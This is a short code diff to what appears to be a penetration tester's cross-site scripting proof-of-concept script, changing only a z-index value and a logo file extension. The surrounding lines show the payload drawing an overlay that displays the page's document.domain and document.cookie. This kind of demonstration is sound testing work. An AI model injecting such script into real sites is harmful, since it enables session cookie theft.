@@ -4,7 +4,7 @@ html = "\
 <style>\
 .tss {\
     position: fixed; /* Stay in place */\
-    z-index: 9999; /* Sit on top */\
+    z-index: 99999; /* Sit on top */\
     padding-top: 100px; /* Location of the box */\
     left: 0;\
     top: 0;\
@@ -28,7 +28,7 @@ html = "\
 \
 <div id='myModal' class='tss'>\
   <div class='tss-content'>\
-    <div style='text-align: center;'><img src=https://www.datacomtss.com.au/images/logo.jpg /><br><span style='font-size: larger'>Cross Site Scripting Proof Of Concept</span><br><br> Cross site scripting vulnerability exploited with the following environment: <br><br> " +
+    <div style='text-align: center;'><img src=https://www.datacomtss.com.au/images/logo.png /><br><span style='font-size: larger'>Cross Site Scripting Proof Of Concept</span><br><br> Cross site scripting vulnerability exploited with the following environment: <br><br> " +
 "<b>document.domain: </b><br>" +
 document.domain + "<br><br>" +
 "<b>document.cookie: </b><br>" +
